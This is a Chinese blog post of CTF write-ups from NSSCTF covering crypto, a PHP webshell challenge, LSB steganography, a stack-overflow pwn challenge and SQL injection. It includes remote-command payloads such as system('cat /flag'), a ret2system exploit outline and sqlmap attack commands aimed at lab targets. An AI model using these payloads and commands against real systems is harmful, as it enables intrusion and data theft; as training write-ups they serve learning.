@@ -1,0 +1,665 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NSSCTF五题积累（七） | 琉璃幻彩的博客</title><meta name="author" content="琉璃幻彩"><meta name="copyright" content="琉璃幻彩"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第一轮1.Crypto[BJDCTF 2020]encode#Base64 #RC4 #XOR附件：  拿到题目首先upx脱壳。再ida32分析：   1234567891011121314151617181920212223242526272829303132int sub_804887C()&#123;  int v0; &#x2F;&#x2F; eax  int result; &#x2F;&#x2F; eax  unsigned">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF五题积累（七）">
+<meta property="og:url" content="https://fightergodnemo.github.io/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/index.html">
+<meta property="og:site_name" content="琉璃幻彩的博客">
+<meta property="og:description" content="第一轮1.Crypto[BJDCTF 2020]encode#Base64 #RC4 #XOR附件：  拿到题目首先upx脱壳。再ida32分析：   1234567891011121314151617181920212223242526272829303132int sub_804887C()&#123;  int v0; &#x2F;&#x2F; eax  int result; &#x2F;&#x2F; eax  unsigned">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fightergodnemo.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2026-03-15T05:28:20.000Z">
+<meta property="article:modified_time" content="2026-05-12T09:34:00.000Z">
+<meta property="article:author" content="琉璃幻彩">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="NSSCTF">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="五题积累">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fightergodnemo.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NSSCTF五题积累（七）",
+  "url": "https://fightergodnemo.github.io/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/",
+  "image": "https://fightergodnemo.github.io/img/avatar.jpg",
+  "datePublished": "2026-03-15T05:28:20.000Z",
+  "dateModified": "2026-05-12T09:34:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "琉璃幻彩",
+      "url": "https://FighterGodNemo.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://fightergodnemo.github.io/2026/03/15/Capture_The_Flag_%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF%E4%BA%94%E9%A2%98%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%83%EF%BC%89/index.html"><link rel="preconnect" href="https://cdn.staticfile.org"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.5.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.20260811113116377.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.staticfile.org/egjs-infinitegrid/4.13.0/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NSSCTF五题积累（七）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><script src="/js/bg-firstpaint.js?v=20260402-2"></script><link rel="stylesheet" href="/css/custom.css?v=20260402-2"><meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="琉璃幻彩的博客" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">149</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">164</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">37</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" data-has-custom-post-top-img="0"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">琉璃幻彩的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">NSSCTF五题积累（七）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">NSSCTF五题积累（七）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-15T05:28:20.000Z" title="发表于 2026-03-15 13:28:20">2026-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-12T09:34:00.000Z" title="更新于 2026-05-12 17:34:00">2026-05-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Capture-The-Flag-%E5%A4%BA%E6%97%97%E8%B5%9B/">Capture_The_Flag_夺旗赛</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Capture-The-Flag-%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/">夺旗赛Write-up</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Capture-The-Flag-%E5%A4%BA%E6%97%97%E8%B5%9B/%E5%A4%BA%E6%97%97%E8%B5%9BWrite-up/NSSCTF/">NSSCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span></div></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第一轮"><a href="#第一轮" class="headerlink" title="第一轮"></a>第一轮</h1><h2 id="1-Crypto"><a href="#1-Crypto" class="headerlink" title="1.Crypto"></a>1.Crypto</h2><h3 id="BJDCTF-2020-encode"><a href="#BJDCTF-2020-encode" class="headerlink" title="[BJDCTF 2020]encode"></a>[BJDCTF 2020]encode</h3><h4 id="Base64-RC4-XOR"><a href="#Base64-RC4-XOR" class="headerlink" title="#Base64 #RC4 #XOR"></a>#Base64 #RC4 #XOR</h4><p><strong>附件：</strong></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227858.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227868.png" loading='lazy'>拿到题目首先upx脱壳。再ida32分析：</p>
+<p><img src="/2025%20NSSCTF/file-20260331130227877.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227886.png" loading='lazy'></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_804887C()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v0; // eax</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [esp+Ch] [ebp-FCh]</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [esp+10h] [ebp-F8h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v4; // [esp+14h] [ebp-F4h]</span><br><span class="line">  char v5[<span class="number">48</span>]; // [esp+1Ah] [ebp-EEh] BYREF</span><br><span class="line">  char v6[<span class="number">178</span>]; // [esp+4Ah] [ebp-BEh] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v7; // [esp+FCh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  strcpy(v5, <span class="string">&quot;Flag&#123;This_a_Flag&#125;&quot;</span>);</span><br><span class="line">  v3 = sub_805BBD0(v5);</span><br><span class="line">  strcpy(v6, <span class="string">&quot;E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E&quot;</span>);</span><br><span class="line">  sub_804F950(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  sub_806DA80(<span class="number">0</span>, &amp;v6[<span class="number">50</span>], <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_805BBD0(&amp;v6[<span class="number">50</span>]) != <span class="number">21</span> )</span><br><span class="line">    sub_804EAF0(<span class="number">0</span>);</span><br><span class="line">  v0 = sub_8048AC2(&amp;v6[<span class="number">50</span>]);</span><br><span class="line">  sub_80481D0(&amp;v5[<span class="number">18</span>], v0);</span><br><span class="line">  v4 = sub_805BBD0(&amp;v5[<span class="number">18</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    v5[i + <span class="number">18</span>] ^= v5[i % v3];</span><br><span class="line">  sub_8048E24(&amp;v5[<span class="number">18</span>], v4, v5, v3);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_8048280(&amp;v5[<span class="number">18</span>], v6) )</span><br><span class="line">    sub_804EAF0(<span class="number">0</span>);</span><br><span class="line">  sub_804F950(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(0x14u) != v7 )</span><br><span class="line">    sub_806FA00();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Web"><a href="#2-Web" class="headerlink" title="2.Web"></a>2.Web</h2><h3 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h3><h4 id="RCEPHP-信息收集"><a href="#RCEPHP-信息收集" class="headerlink" title="#RCEPHP #信息收集"></a>#RCEPHP #信息收集</h4><p><img src="/2025%20NSSCTF/file-20260331130228263.png" loading='lazy'></p>
+<p>法一：打开网页看到一句话木马命令（想到中国蚁剑）</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228242.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228233.png" loading='lazy'></p>
+<p>退到最外层，直接找到flag</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228224.png" loading='lazy'></p>
+<p>NSSCTF{62487fd7-b969-4456-a318-f777ccbb1cc1}</p>
+<p>法二：Hackbar，根据页面提示使用POST方式以wllm为参传值；<br>先传入system(“ls &#x2F;“);查出根目录下有flag文件；在传入system(“cat &#x2F;flag”);查看flag。</p>
+<p><code>**wllm=system(&quot;ls /&quot;);**</code></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228135.png" loading='lazy'></p>
+<p><code>wllm=system(&#39;cat /flag&#39;);</code></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228145.png" loading='lazy'></p>
+<p>NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}</p>
+<p>法三：Burpsuite</p>
+<p>Repeater把GET改为POST，右侧Inspector添加请求主体参数。</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228125.png" loading='lazy'></p>
+<p>发送查看响应：</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228116.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228108.png" loading='lazy'></p>
+<p>NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}</p>
+<h2 id="3-Misc"><a href="#3-Misc" class="headerlink" title="3.Misc"></a>3.Misc</h2><h3 id="NSSRound-V-Team-画出一个flag"><a href="#NSSRound-V-Team-画出一个flag" class="headerlink" title="[NSSRound#V Team]画出一个flag"></a>[NSSRound#V Team]画出一个flag</h3><h4 id="LSB-MISC-图片隐写"><a href="#LSB-MISC-图片隐写" class="headerlink" title="#LSB #MISC #图片隐写"></a>#LSB #MISC #图片隐写</h4><p><img src="/2025%20NSSCTF/file-20260331130228213.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228195.png" loading='lazy'></p>
+<p>翻了一下，无特别的信息。</p>
+<p>使用Stegsolve查看LSB</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228163.png" loading='lazy'></p>
+<p>保存为zip，解压出一个flag.dat</p>
+<p>根据题目名提示flag是画出来的。于是尝试base64解码后转为01字符串：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/glj07/Desktop/flag.dat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    encoded_data = file.read()</span><br><span class="line">decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">binary_string=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte,<span class="string">&#x27;08b&#x27;</span>)<span class="keyword">for</span> byte <span class="keyword">in</span> decoded_data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(binary_string)</span><br></pre></td></tr></table></figure>
+
+<p>缩小看的确暗藏玄机。</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228204.png" loading='lazy'></p>
+<p>需要不断调整窗口比例和缩放比例，直至能辨认无误。看得那叫一个老眼昏花。</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228154.png" loading='lazy'></p>
+<p>这样不错，最清楚了</p>
+<p>NSSCTF{!!Draw_draw_A_flag!!}</p>
+<h2 id="4-Pwn"><a href="#4-Pwn" class="headerlink" title="4.Pwn"></a>4.Pwn</h2><h3 id="WUSTCTF-2020-getshell2"><a href="#WUSTCTF-2020-getshell2" class="headerlink" title="[WUSTCTF 2020]getshell2"></a>[WUSTCTF 2020]getshell2</h3><h4 id="栈溢出-ret2syscall-栈"><a href="#栈溢出-ret2syscall-栈" class="headerlink" title="#栈溢出 #ret2syscall #栈"></a>#栈溢出 #ret2syscall #栈</h4><p>附件：service</p>
+<p>题目环境：</p>
+<p>直接file+checksec</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228790.png" loading='lazy'></p>
+<p>只开启了栈不可执行，应该是栈溢出题目。</p>
+<p>使用ROPgadget</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228771.png" loading='lazy'></p>
+<p>找到了sh地址：0x08048670 </p>
+<p>直接写死：sh_addr &#x3D; 0x08048670</p>
+<p><img src="/2025%20NSSCTF/file-20260331130228763.png" loading='lazy'></p>
+<p>栈溢出（Stack Overflow） 漏洞：</p>
+<ul>
+<li>程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）</li>
+<li>当攻击者输入超长数据后,会覆盖返回地址（Return Address）</li>
+</ul>
+<p><img src="/2025%20NSSCTF/file-20260331130228754.png" loading='lazy'></p>
+<ul>
+<li><code>gets()</code>、<code>strcpy()</code> 等属于没有边界检查的函数。</li>
+</ul>
+<p>🛠️ 六、完整攻击流程</p>
+<ol>
+<li><strong>连接远程服务</strong></li>
+<li><strong>p &#x3D; remote(‘ip’, port)</strong></li>
+</ol>
+<p><strong>构造 payload</strong></p>
+<pre><code>- 填充 28 字节到返回地址位置
+- 覆盖返回地址为 `system`
+- 提供 fake return 和 `&quot;sh&quot;` 地址
+</code></pre>
+<ol start="3">
+<li><strong>发送 payload</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line"></span><br><span class="line">编辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>进入交互模式，输入命令</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line"></span><br><span class="line">编辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1p.interactive()  # 之后你就可以输入 ls, cat flag.txt 等</span><br></pre></td></tr></table></figure>
+
+<p>Q1: 为什么不用 <code>&quot;/bin/sh&quot;</code>，而用 <code>&quot;sh&quot;</code>？</p>
+<p>很多题目为了简化，只放了 <code>&quot;sh&quot;</code>。</p>
+<p>在 Linux 中，<code>system(&quot;sh&quot;)</code> 和 <code>system(&quot;/bin/sh&quot;)</code> 效果几乎一样，都能弹 shell。</p>
+<p>Q2: <code>0xdeadbeef</code> 是什么？会 crash 吗？</p>
+<p>它只是一个“占位符”，表示“随便填个地址”。</p>
+<p>只要你在 <code>system</code> 返回前已经拿到 shell，程序是否 crash 都不影响你读 flag。</p>
+<p>Q3: 为什么偏移是 28（0x18+4）？</p>
+<p><code>0x18 = 24</code> 字节是 buffer 大小</p>
+<p><code>+4</code> 是 saved ebp（旧的栈基址指针）</p>
+<p>总共 28 字节后，才是返回地址</p>
+<h2 id="5-Reverse"><a href="#5-Reverse" class="headerlink" title="5.Reverse"></a>5.Reverse</h2><h3 id="BJDCTF-2020-Easy"><a href="#BJDCTF-2020-Easy" class="headerlink" title="[BJDCTF_2020]Easy"></a>[BJDCTF_2020]Easy</h3><p>附件：easy.exe</p>
+<p>无壳程序，直接分析即可</p>
+<p><img src="/2025%20NSSCTF/file-20260331130230842.png" loading='lazy'></p>
+<h1 id="第二轮"><a href="#第二轮" class="headerlink" title="第二轮"></a>第二轮</h1><h2 id="1-Crypto-1"><a href="#1-Crypto-1" class="headerlink" title="1.Crypto"></a>1.Crypto</h2><h3 id="CryptoCTF-2020-One-Line-Crypto"><a href="#CryptoCTF-2020-One-Line-Crypto" class="headerlink" title="[CryptoCTF_2020]One_Line_Crypto"></a>[CryptoCTF_2020]One_Line_Crypto</h3><p><img src="/2025%20NSSCTF/file-20260331130230861.png" loading='lazy'></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> m, n, x, y, flag</span><br><span class="line"></span><br><span class="line">p, q = x**(m+<span class="number">1</span>) - (x+<span class="number">1</span>)**m, y**(n+<span class="number">1</span>) - (y+<span class="number">1</span>)**n</span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> p &lt; q &lt; p &lt;&lt; <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(p*q)[<span class="number">2</span>:]) == <span class="number">2048</span></span><br><span class="line">enc = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(enc, <span class="number">0x10001</span>, p*q))</span><br></pre></td></tr></table></figure>
+
+<p>enc文件：14608474132952352328897080717325464308438322623319847428447933943202421270837793998477083014291941466731019653023483491235062655934244065705032549531016125948268383108879698723118735440224501070612559381488973867339949208410120554358243554988690125725017934324313420395669218392736333195595568629468510362825066512708008360268113724800748727389663826686526781051838485024304995256341660882888351454147057956887890382690983135114799585596506505555357140161761871724188274546128208872045878153092716215744912986603891814964771125466939491888724521626291403272010814738087901173244711311698792435222513388474103420001421</p>
+<h2 id="2-Web-1"><a href="#2-Web-1" class="headerlink" title="2.Web"></a>2.Web</h2><h3 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h3><h4 id="目录扫描-信息收集-git泄露"><a href="#目录扫描-信息收集-git泄露" class="headerlink" title="#目录扫描 #信息收集 #.git泄露"></a>#目录扫描 #信息收集 #.git泄露</h4><p><img src="/2025%20NSSCTF/file-20260331130228045.png" loading='lazy'></p>
+<p>使用御剑工具扫描，发现大量域名</p>
+<p><img src="/2025%20NSSCTF/file-20260331130227997.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130228026.png" loading='lazy'><img src="/2025%20NSSCTF/file-20260331130228006.png" loading='lazy'></p>
+<p>NSSCTF{f632d0a0-0321-4df6-b3b7-fae9e4c0b269}</p>
+<p><strong>Robots</strong></p>
+<p>昨天十三年社团讲课，讲了Robots.txt的作用，小刚上课没有认真听课正在着急，你能不能帮帮忙</p>
+<p><img src="/2025%20NSSCTF/file-20260331130227988.png" loading='lazy'></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227970.png" loading='lazy'></p>
+<p>flag{29d2b23a9f2145888d1f8c76e2b4a8b4}</p>
+<p>[SWPUCTF 2021 新生赛]easy_sql</p>
+<p>SQL注入报错注入布尔盲注</p>
+<p>  第一步：信息收集（基础侦察）</p>
+<p>  目标： 确认目标可达，收集基本信息</p>
+<p><code>curl -I &quot;http://node4.anna.nssctf.cn:24443/&quot;</code></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227979.png" loading='lazy'></p>
+<p>看什么：</p>
+<ul>
+<li>HTTP状态码：200 OK（目标存活）</li>
+<li>Server：nginx&#x2F;1.14.2（Web服务器信息）</li>
+<li>X-Powered-By：PHP&#x2F;5.6.40（后端语言，老版本可能有漏洞）</li>
+</ul>
+<p> 经验： curl -I 比直接访问页面更快，只看头部信息，不下载内容！</p>
+<p>第二步：分析页面，找参数</p>
+<p>  目标： 找到可能存在SQL注入的参数</p>
+<p><code>curl -s &quot;http://node4.anna.nssctf.cn:24443/&quot;</code></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227960.png" loading='lazy'></p>
+<p>Ctrl+U查看源代码也可</p>
+<p><img src="/2025%20NSSCTF/file-20260331130227941.png" loading='lazy'></p>
+<p>观察结果：</p>
+<ul>
+<li>页面标题：”参数是 wllm” ← 重要线索！</li>
+<li>页面内容：”球球你输入点东西吧！” ← 说明需要输入参数</li>
+</ul>
+<p>推理： 存在一个叫 wllm 的GET参数</p>
+<p>  测试参数：</p>
+<p><code>curl -s &quot;http://node4.anna.nssctf.cn:24443/?wllm=test&quot;</code></p>
+<p><img src="/2025%20NSSCTF/file-20260331130227951.png" loading='lazy'></p>
+<p>先用普通值测试参数是否被处理，页面变化&#x3D;参数有效</p>
+<p>  第三步：确认SQL注入漏洞</p>
+<p>  目标： 验证是否存在SQL注入</p>
+<p><code>curl -s &quot;http://node4.anna.nssctf.cn:24443/?wllm=test&quot;</code></p>
+<p>  观察什么：<br>  如果看到SQL错误信息，说明存在注入！比如：<br>  You have an error in your SQL syntax…</p>
+<p>经验： 单引号 ‘ 是最简单的SQL注入测试字符，能快速暴露漏洞！</p>
+<p> 第四步：SQLMap自动化攻击</p>
+<p>  现在开始真正使用SQLMap！</p>
+<p>  4.1 基础扫描（找注入点）</p>
+<p>  命令：<br><code>sqlmap -u &quot;http://node4.anna.nssctf.cn:24443/?wllm=1&quot; --batch</code></p>
+<p>  参数解释：</p>
+<ul>
+<li><p>-u：目标URL</p>
+</li>
+<li><p>?wllm&#x3D;1：给参数一个普通值</p>
+</li>
+<li><p>–batch：自动选择，不问问题</p>
+<p>看什么：<br>SQLMap会告诉你：</p>
+</li>
+<li><p>注入类型（Boolean、Time、Error等）</p>
+</li>
+<li><p>注入技术（UNION、Boolean等）</p>
+</li>
+</ul>
